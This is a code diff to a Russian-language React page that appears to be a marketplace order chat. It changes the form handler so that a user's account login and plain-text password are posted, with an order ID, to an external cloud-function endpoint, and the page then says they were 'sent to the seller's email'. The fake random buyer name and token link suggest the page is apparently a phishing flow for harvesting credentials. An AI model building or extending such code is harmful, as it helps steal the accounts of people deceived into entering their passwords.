@@ -31,21 +31,45 @@ const Index = () => {
   const buyerName = 'User_' + Math.random().toString(36).substring(2, 8);
   const uniqueLink = `${window.location.origin}/?order=${orderId}&token=${Math.random().toString(36).substring(2, 15)}`;
 
-  const handleSubmitData = (e: React.FormEvent) => {
+  const handleSubmitData = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!accountData.login || !accountData.password) {
       toast.error('Заполните все поля');
       return;
     }
-    toast.success('Данные успешно отправлены продавцу');
-    setChatMessages([...chatMessages, {
-      id: chatMessages.length + 1,
-      sender: 'Вы',
-      message: 'Данные для входа отправлены',
-      time: new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' }),
-      isOwn: true
-    }]);
-    setAccountData({ login: '', password: '' });
+
+    try {
+      const response = await fetch('https://functions.poehali.dev/f6a8ed6d-0d75-404a-bf63-0c9791af308e', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          login: accountData.login,
+          password: accountData.password,
+          orderId: orderId
+        })
+      });
+
+      const data = await response.json();
+
+      if (response.ok && data.success) {
+        toast.success('Данные успешно отправлены на почту продавца');
+        setChatMessages([...chatMessages, {
+          id: chatMessages.length + 1,
+          sender: 'Вы',
+          message: 'Данные для входа отправлены',
+          time: new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' }),
+          isOwn: true
+        }]);
+        setAccountData({ login: '', password: '' });
+      } else {
+        toast.error('Ошибка отправки: ' + (data.error || 'Неизвестная ошибка'));
+      }
+    } catch (error) {
+      toast.error('Не удалось отправить данные');
+      console.error('Error sending data:', error);
+    }
   };
 
   const handleSendMessage = (e: React.FormEvent) => {
